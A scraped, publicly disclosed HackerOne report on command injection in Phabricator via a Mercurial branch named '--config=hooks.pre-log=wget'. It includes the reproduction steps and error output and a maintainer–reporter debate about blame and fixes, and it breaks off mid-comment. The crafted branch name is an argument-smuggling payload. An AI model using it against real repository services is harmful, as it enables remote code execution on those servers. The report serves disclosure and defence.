{"id":288704,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODg3MDQ=","url":"https://hackerone.com/reports/288704","title":"Command injection on Phabricator instance with an evil hg branch name","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-11-09T08:57:35.077Z","submitted_at":"2017-11-09T08:57:35.077Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"pnig0s","url":"/pnig0s","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":18,"url":"https://hackerone.com/phabricator","handle":"phabricator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Phabricator","twitter_handle":"phabricator","website":"http://phacility.com/phabricator/","about":"Phabricator is a collection of open source web applications that help software companies build better software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-11T00:42:44.118Z","bug_reporter_agreed_on_going_public_at":"2017-11-11T00:42:43.979Z","team_member_agreed_on_going_public_at":"2017-11-10T16:49:58.513Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi phabricator,\n\nI found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.\n\nHere is the reproduction steps:\n1. Monitor a remote mercurial repo with phabricator;\n2. Create a branch and called \"--config=hooks.pre-log=wget\" on the remote;\n3. After phabricator update the remote repo,visit the history page of that crafted branch;\n```\nhttp://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/\n```\n4. It will raise an error like below and the wget command will be executed;\n5. I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).\n\n```\nCommand failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-\nconnect' log --debug --template '{node};{parents}\\n' --limit 101 -b '--config=hooks.pre-log=wget' --rev \n'reverse(ancestors('\\''84e8c5feb4faba2f1b230575e747c3bffe7c7a3c'\\''))' STDOUT running hook pre-log: \nwget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file \n/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... \n[URL]... Try `wget --help' for more options. abort: pre-log hook exited with status 1\n```\nThe root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.\nThanks!","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":237921,"file_name":"evil_hg_branch_name_command_injection.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/237/921/7ec657be3a8e22865edac940b577af482656abf8/evil_hg_branch_name_command_injection.png?response-content-disposition=attachment%3B%20filename%3D%22evil_hg_branch_name_command_injection.png%22%3B%20filename%2A%3DUTF-8%27%27evil_hg_branch_name_command_injection.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTQR22CE2%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143855Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHylhpFJOF4pRe7XlaDX6z3BLEup%2BswnNkaACr%2Fwjwr8AiASjuyeD0TYwrZA5sOldf5eC6UQrO8hSHC9jNR%2BVNumhyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMfK%2BofD1wJOHYcOUJKtcDnC3f8Y3jglGs7z8YlxF9bdYkYlsSrPxEkx9hDqtH%2BQ3u1daZrwyM6F3WHlk0a%2BWNezGk%2FnRxFWuvgXlXXAEBaCUWEe1UXv97gs6KKr%2F4fZ92%2FH3VXeVMioYLi220Z8qDdmiwSK2Z%2FPfK0nlRhO3v9Ee3r3C7BMq5B4DRnfxp0cJyzU%2FHbMNzQNjyO%2BlGzreHCzcyKBe%2FoFAr2W6xbLokCINrIUxMnvI9Mxs7SraD%2FF2sZw8Ln4uZ6aJweQoOPwsnYKkrRjb370Lt%2FREkrEj9pcgae0C9R5BTZegZaqNN6CzMkZfNHB7RmNrhJFg6j7%2BfPYLcWFNxzvJV9dbVJdocqrM5Jmi3hE47KOBrMSGuFrCha2vRk9P64hqfhM1GdDtMLFZZn5VqOJgdyVWZ8bTrZpmlBP%2FJ6YiHIaMTH8G%2FRndaRrVRAR8iOSqWok%2FikWajxMvcVA29H%2F5RznwCFPkLrSbv34tOiWcwVp50Yy3HjkGq4LnY67LMRRRIwThQ9vc%2BM3G9xlb7TwO6%2F3vE5U6azDCH6hDFQ3Xi8ZJVYrTOOWINnf%2BC3BIhvL8Uql%2FhI1vUmbQiAR01xN%2FdEQ9ReTSo0pfJ3SDSXhBXiwUW0IRKspJO189rJyI3MImNkYsGOqYBwdOGh60JXyl1FPj8jwEbnfg6var6H0hyaUwn%2B%2FnamMWODqDwoSJI6f0Q6RJHnQJo2gfc6OFgj1W2B%2FGcJDL4gMvwPBD8bBDDMSaZ3x1nqw%2FhzMwsaQP%2BTnUJEKAVQSe3o5Yvwzg%2FSvpNP%2By981FbIZs9aWoGNPHY48ZIUNdNLCWPS2PxNm9xHrAxEcqn8ib1XLvQQS%2FALl2CG36%2BewUP2tPIf%2BIPmw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=94fdb53ad31b1d4d3f8c10bad1702f84899b03df831f0aa19b73f37c6937ae57","file_size":49085,"type":"image/png"},{"id":237923,"file_name":"evil_hg_branch_name_command_injection_cloud.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/237/923/09a969f6698aefcd9d99271d0600471b28e4c279/evil_hg_branch_name_command_injection_cloud.png?response-content-disposition=attachment%3B%20filename%3D%22evil_hg_branch_name_command_injection_cloud.png%22%3B%20filename%2A%3DUTF-8%27%27evil_hg_branch_name_command_injection_cloud.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTQR22CE2%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143855Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHylhpFJOF4pRe7XlaDX6z3BLEup%2BswnNkaACr%2Fwjwr8AiASjuyeD0TYwrZA5sOldf5eC6UQrO8hSHC9jNR%2BVNumhyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMfK%2BofD1wJOHYcOUJKtcDnC3f8Y3jglGs7z8YlxF9bdYkYlsSrPxEkx9hDqtH%2BQ3u1daZrwyM6F3WHlk0a%2BWNezGk%2FnRxFWuvgXlXXAEBaCUWEe1UXv97gs6KKr%2F4fZ92%2FH3VXeVMioYLi220Z8qDdmiwSK2Z%2FPfK0nlRhO3v9Ee3r3C7BMq5B4DRnfxp0cJyzU%2FHbMNzQNjyO%2BlGzreHCzcyKBe%2FoFAr2W6xbLokCINrIUxMnvI9Mxs7SraD%2FF2sZw8Ln4uZ6aJweQoOPwsnYKkrRjb370Lt%2FREkrEj9pcgae0C9R5BTZegZaqNN6CzMkZfNHB7RmNrhJFg6j7%2BfPYLcWFNxzvJV9dbVJdocqrM5Jmi3hE47KOBrMSGuFrCha2vRk9P64hqfhM1GdDtMLFZZn5VqOJgdyVWZ8bTrZpmlBP%2FJ6YiHIaMTH8G%2FRndaRrVRAR8iOSqWok%2FikWajxMvcVA29H%2F5RznwCFPkLrSbv34tOiWcwVp50Yy3HjkGq4LnY67LMRRRIwThQ9vc%2BM3G9xlb7TwO6%2F3vE5U6azDCH6hDFQ3Xi8ZJVYrTOOWINnf%2BC3BIhvL8Uql%2FhI1vUmbQiAR01xN%2FdEQ9ReTSo0pfJ3SDSXhBXiwUW0IRKspJO189rJyI3MImNkYsGOqYBwdOGh60JXyl1FPj8jwEbnfg6var6H0hyaUwn%2B%2FnamMWODqDwoSJI6f0Q6RJHnQJo2gfc6OFgj1W2B%2FGcJDL4gMvwPBD8bBDDMSaZ3x1nqw%2FhzMwsaQP%2BTnUJEKAVQSe3o5Yvwzg%2FSvpNP%2By981FbIZs9aWoGNPHY48ZIUNdNLCWPS2PxNm9xHrAxEcqn8ib1XLvQQS%2FALl2CG36%2BewUP2tPIf%2BIPmw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=97b761b1fbf718e93d1fbadf331259c23546ad4162040b0c8d417e2427880d68","file_size":72177,"type":"image/png"}],"allow_singular_disclosure_at":"2017-12-10T16:49:58.678Z","allow_singular_disclosure_after":-121038537.30331527,"singular_disclosure_allowed":true,"vote_count":40,"voters":["zzero","jr0ch17","europa","secator","hunter","michiel","pnig0s","bl4de","sameerphad72","spam404","and 30 more..."],"severity":{"rating":"critical","score":9.9,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2146046,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can reproduce the important part of this locally with Mercurial `4.4.1`.\n\nHave you reported this to Mercurial, or do you believe Mercurial is already aware of it? I'd like to coordinate with the Mercurial upstream around this because they've previously considered similar issues to be security concerns (CVE-2017-9462, CVE-2017-1000116) and I think this is ultimately a Mercurial issue, not a Phabricator issue, although it's severe and we'll need to mitigate it.\n\nIf you haven't reported this to Mercurial yet I can report it on your behalf, but if you've already reported it, plan to report it, or believe someone else has already reported it it would be helpful to know about that.\n\n(I'm going to get in touch with them regardless, because any fix will make will reveal the vulnerability.)","automated_response":false,"created_at":"2017-11-09T13:35:03.903Z","updated_at":"2017-11-09T13:35:03.903Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2146072,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think the hook usage in this place is a normal use for mercurial rather than a vulnerability.Application use hg command need to place any user applied input after \"--\" or use the sha value instead the string value.\nI haven't reported this to them yet,cause i don't think this is on their side.The hook pre-log is designed to be executed before hg log command.","automated_response":false,"created_at":"2017-11-09T13:51:34.317Z","updated_at":"2017-11-09T13:51:34.317Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146077,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You can place the option --config=hooks.pre-[log|pull|update|cat|...etc] to the certain and it's a normal usage not like the one you point out in the comment.","automated_response":false,"created_at":"2017-11-09T13:54:58.982Z","updated_at":"2017-11-09T13:54:58.982Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146083,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just like the git rebase command,if a filename called --exec=id and some application use this directly and inject to the git rebase command that will lead to command injection and this is totaly not the git's fault.","automated_response":false,"created_at":"2017-11-09T13:57:57.708Z","updated_at":"2017-11-09T13:57:57.708Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146098,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I already did some testing on phabricator and the filename always have a prefix \"./\" when executing command and the branch name in other place will force to convert to it's SHA value and your guys just missed this hg log scenario.","automated_response":false,"created_at":"2017-11-09T14:02:03.957Z","updated_at":"2017-11-09T14:02:03.957Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146105,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think Mercurial is in the wrong here, for two reasons.\n\nFirst, its behavior is inconsistent with other software. Consider:\n\n```\n$ git rebase --onto '--exec=wget' master\nfatal: Needed a single revision\nDoes not point to a valid commit: --exec=wget\n```\n\nGit interprets `--exec=wget` as the target for `--onto` because it immediately follows the `--onto` flag.\n\n```\n$ python -c -d 'print 1'\nTraceback (most recent call last):\n  File \"\u003cstring\u003e\", line 1, in \u003cmodule\u003e\nNameError: name 'd' is not defined\n```\n\nPython interprets `-d` as the command to execute with `-c`, not a flag, because it immediately follows the `-c` flag.\n\nAll software I'm familiar with works like this: if an `--argument` takes a parameter, that parameter is _always_ interpreted as the value for the argument, not a flag.\n\nSecond, it's impossible to escape this command safely. We can't add `--`:\n\n```\n$ hg log --b -- '--config=hooks.pre-log=wget' --rev x\nhg log: option --branch requires argument\n```\n\n...and I believe it's unreasonable for Mercurial to take the position that callers must test and reject \"unsafe\" branch names before invoking commands.\n\nThat said, it's possible that Mercurial will not consider this to be a vulnerability.","automated_response":false,"created_at":"2017-11-09T14:05:05.053Z","updated_at":"2017-11-09T14:05:05.053Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2146111,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's the mail I sent Mercurial's security list:\n\n---\nTo: security@mercurial-scm.org\nSubject: Command Injection: hg log -b '--config=...' --rev x\n\nMercurial interprets the branch name \"--config=...\" as a \"--config\" flag in this command:\n\n\t$ hg log -b '--config=hooks.pre-log=wget' --rev x\n\twget: missing URL\n\tUsage: wget [OPTION]... [URL]...\n\n\tTry `wget --help' for more options.\n\tabort: pre-log hook exited with status 1\n\nThis reproduces for me in Mercurial 4.4.1, and appears to impact some larger number of flags (perhaps all flags which take arguments?) provided that the flag is not the last argument in the command. For example, I can `hg log --rev '--config=...' -b x` instead.\n\nThis may represent a security vulnerability if software invokes this command or other similar commands with user input, even when that input is properly escaped (above, the \"--config\" flag has been properly escaped for the shell).\n\nI learned of this because I received a vulnerability report for some software I help maintain (\"Phabricator\") via HackerOne earlier this morning, so credit tentatively goes to Tianqi Zhang (pnig0s) on that platform. (I've asked him for more information about how he discovered this, since I'm not sure if he's the original researcher or not.)\n\nThe impact on Phabricator is critical (remote code execution) so we need to respond to this regardless of what Mercurial does with it. This issue may already be known, but our fix will disclose the nature of the issue so I wanted to coordinate with the Mercurial upstream in case this is something you also consider significant.\n\nIn my assessment, this is generally similar in nature to CVE-2017-9462 and CVE-2017-1000116.\n\nIf Mercurial does not consider this to be a security issue, we'll fix this and disclose it (by nature of the changelog and repository being open source) today, probably via kludgy blacklisting. We're happy to wait if you want to take action here and coordinate releases on a different timeline, though.\n\n(I don't plan to allocate a CVE identifier since this isn't my discovery and I'm not sure if Mercurial considers it a vulnerability.)\n\nThanks,\nEvan","automated_response":false,"created_at":"2017-11-09T14:06:41.626Z","updated_at":"2017-11-09T14:06:41.626Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2146136,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Alright i'll wait for the reply from mercurial but i think the good practice is just use the SHA value instead of the string value supplied by user.","automated_response":false,"created_at":"2017-11-09T14:18:07.964Z","updated_at":"2017-11-09T14:18:07.964Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146139,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm going to wait for a response from the Mercurial upstream.\n\nIf they don't consider this to be a vulnerability in Mercurial, we'll patch, release, and disclose it ASAP (probably today if they get back to us in the next few hours), since this has a major security impact on Phabricator.\n\nIf they do consider it to be a vulnerability, we'll work with them to figure out a release/disclosure timeline, since our fix will necessarily reveal the nature of the vulnerability.\n\nIf I don't hear back from them in ~36 hours we'll probably move forward with this without their involvement, but we'll see.","automated_response":false,"created_at":"2017-11-09T14:18:47.847Z","updated_at":"2017-11-09T14:18:47.847Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2146147,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Alright i'll wait for the reply from mercurial but i think the good practice is just use the SHA value instead of the string value supplied by user.\n\nIn the general case, this isn't possible. Not all parameters have SHA equivalents, and I think `hg log -b default` can not be equivalent to `hg log -b \u003cany hash\u003e` because `default` may have multiple open branch heads which are not mutual ancestors.","automated_response":false,"created_at":"2017-11-09T14:22:24.001Z","updated_at":"2017-11-09T14:22:24.001Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2146175,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well i think you can just make the \"default\" a fix string in the hg command when it need to be used rather than use this from user supplied like other customed branches.I also tested similar issue on other applications that support mercurial and most of them force using SHA value,fix the \"default\" branch name or put \"--\" before user applied value.I think combine above three methods can fix these kind of issue.","automated_response":false,"created_at":"2017-11-09T14:29:39.146Z","updated_at":"2017-11-09T14:29:39.146Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146209,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This definitely can not be fixed by making \"default\" a hard-coded string, using \"--\", or converting branch names into SHA values. Those workarounds either do not work or change the meaning of the command. \n\nAlso note that `--config=hooks.pre-log=wget` is a perfectly valid Mercurial branch name:\n\n```\n$ hg branch -- '--config=hooks.pre-log=wget'\nmarked working directory as branch --config=hooks.pre-log=wget\n```\n\n```\n$ hg heads\nchangeset:   21:60e36457f9cd\nbranch:      --config=hooks.pre-log=wget\ntag:         tip\nuser:        Evan Priestley \u003chg@yghe.net\u003e\ndate:        Thu Nov 09 06:34:45 2017 -0800\n```\n\nIt can be *worked around* by using revset syntax so that we don't specify any additional parameters, but this is not robust or general.\n\nI'm also not convinced that this is the only vulnerable command. Even if it is, we need to put a fix in place not only for existing commands, but also for possible future commands, so we don't turn around and introduce another vulnerable command in the future.","automated_response":false,"created_at":"2017-11-09T14:41:49.734Z","updated_at":"2017-11-09T14:41:49.734Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2146267,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"How about using \"hg log --branch=--config=hooks.pre-log=wget\" as long as the beginning of the value is not \"-\" or \"--\" the option won't work any more.\n\n```\n# hg log --branch=--config=hooks.pre-log=wget\nchangeset:   71:84e8c5feb4fa\nbranch:      --config=hooks.pre-log=wget\nparent:      68:90b627c305ef\nuser:        pwn2own \u003cpnigos@live.com\u003e\ndate:        Thu Nov 09 07:45:15 2017 +0000\nsummary:     Created new branch --config=hooks.pre-log=wget\n```","automated_response":false,"created_at":"2017-11-09T14:57:35.553Z","updated_at":"2017-11-09T14:57:35.553Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146276,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think the goal of the hook feature is designed to be executed as a high priority than other command options so that there're pre-command,post-command and fail-command kind of hooks here.Also the --config is a global hg option and not for some certain sub-command.","automated_response":false,"created_at":"2017-11-09T15:02:44.033Z","updated_at":"2017-11-09T15:02:44.033Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146585,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Mercurial security replied, and said that they expect to respond today or tomorrow.\n\n(The upstream task for this is \u003chttps://secure.phabricator.com/T13012\u003e, although it's not currently public.)\n\nWe tentatively have a patch ready for this when Mercurial makes a decision.","automated_response":false,"created_at":"2017-11-09T16:12:31.536Z","updated_at":"2017-11-09T16:12:31.536Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2147602,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Mercurial had already mentioned the risk about this kind issue in https://www.mercurial-scm.org/repo/hg/rev/77eaf9539499\n```\nWe're not currently hardening any subcommands other than 'serve'. If\nyour service exposes other commands to users with arbitrary repository\nnames, it is imperative that you defend against repository names of\n'--debugger' and anything starting with '--config'.\n```","automated_response":false,"created_at":"2017-11-09T22:26:54.143Z","updated_at":"2017-11-09T22:26:54.143Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2147658,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think Mercurial's behavior is *clearly* wrong. Consider this:\n\n```\n$ hg grep -- --debugger\nentering debugger - type c to continue starting hg or h for help\n...\n```\n\nThey may choose not to fix it, but the magical, nonstandard, dangerous behavior of the `--config` and `--debugger` flags is clearly a problem with Mercurial and their \"messy implementation of argument parsing\", not a reasonable caveat which implementors building on top of `hg` should be expected to anticipate.","automated_response":false,"created_at":"2017-11-09T22:43:35.959Z","updated_at":"2017-11-09T22:43:35.959Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2147689,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I just think mercurial can't be totally blamed by this.Application using mercurial do have ways to mitigate this kind risk.This is not a directly vulnerability like the serve sub-command.It's just some kind dangerous feature that other developer should be careful with.And directly using user input as the option of command is definely not a safe and good practice.Today is mercurial,maybe there's other application have these kind features,you can't blame them all.Other application support mercurial like Bitbucket not affected by this issue at all.Maybe mercurial will hardern this or maybe not.But the responsibility from phabricator side still can't be ignored.","automated_response":false,"created_at":"2017-11-09T23:02:34.275Z","updated_at":"2017-11-09T23:02:34.275Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2147695,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You can't make every application you execute with all safe,so the key point here is how to safely invoke them to mitigate the risk.","automated_response":false,"created_at":"2017-11-09T23:05:47.627Z","updated_at":"2017-11-09T23:05:47.627Z","actor":{"username":"pnig0s","cleared":true,"url":"/pnig0s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/213/e112ceef38cf6dd1b3bad43caa88880a151ec75f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2147778,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe Evan's point is that Mercurial's approach makes it *very* difficult to safely invoke the `hg` binary. We'll definitely work around this issue in Phabricator if Mercurial decides not to fix it, but I agree with Evan that this would be much better fixed in the upstream. There's nothing to prevent Mercurial from adding additional `--do-something-dangerous` flags forever that we'll need to explicitly check for in our 